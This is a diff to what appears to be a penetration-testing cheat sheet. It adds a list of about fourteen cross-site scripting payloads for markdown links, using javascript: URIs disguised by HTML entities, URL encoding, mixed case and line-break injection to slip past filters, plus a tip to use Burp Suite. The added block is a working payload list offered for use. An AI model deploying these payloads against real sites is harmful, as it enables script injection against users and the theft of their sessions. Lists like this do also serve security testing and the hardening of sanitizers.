@@ -33,7 +33,21 @@
 #### for markdown
 - __`/?name=[test123](javascript://alert'')`__
 - __`/?name=[test123](javascript:alert'')`__
-
-
+```
+[a](javascript:this;alert(1))
+[a](javascript:this;alert(1&#41;)
+[a](javascript&#58this;alert(1&#41;)
+[a](Javas&#99;ript:alert(1&#41;)
+[a](Javas%26%2399;ript:alert(1&#41;)
+[a](javascript:alert&#65534;(1&#41;)
+[a](javascript:confirm(1)
+[a](javascript://www.google.com%0Aprompt(1))
+[a](javascript://%0d%0aconfirm(1);com)
+[a](javascript:window.onerror=confirm;throw%201)
+[a](javascript:alert(document.domain&#41;)
+[a](javascript://www.google.com%0Aalert(1))
+[a]('javascript:alert("1")')
+[a](JaVaScRiPt:alert(1))
+```
 - > __If you are not getting /?name=test123 in url you can use burpsuite__
   - ![image1](https://github.com/Chittu13/All_in_one/blob/main/image/image1.png)
